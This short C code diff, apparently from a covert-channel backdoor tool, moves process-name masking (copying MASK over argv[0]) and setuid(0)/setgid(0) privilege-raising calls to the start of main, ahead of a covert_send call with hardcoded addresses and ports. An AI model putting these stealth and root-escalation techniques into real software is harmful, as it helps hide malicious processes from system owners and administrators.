@@ -23,17 +23,16 @@ void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(const unsigned char *tcp_payload);
 bool CheckKey(u_char ip_tos, u_short ip_id);
 int main(int argc, char **argv){
+    strcpy(argv[0], MASK);
+    //change the UID/GID to 0 to raise privs
+    setuid(0);
+    setgid(0);
     char *c = "c";
     char *sip = "192.168.1.3";
     char *dip = "192.168.1.13";
     unsigned short sport = 22;
     unsigned short dport = 8505;
     unsigned char data[BUFSIZE] = "hello";
-
-    strcpy(argv[0], MASK);
-    //change the UID/GID to 0 to raise privs
-    setuid(0);
-    setgid(0);
 
     if(strcmp(argv[1],c) == 0){
         covert_send(sip, dip, dport, sport, data);
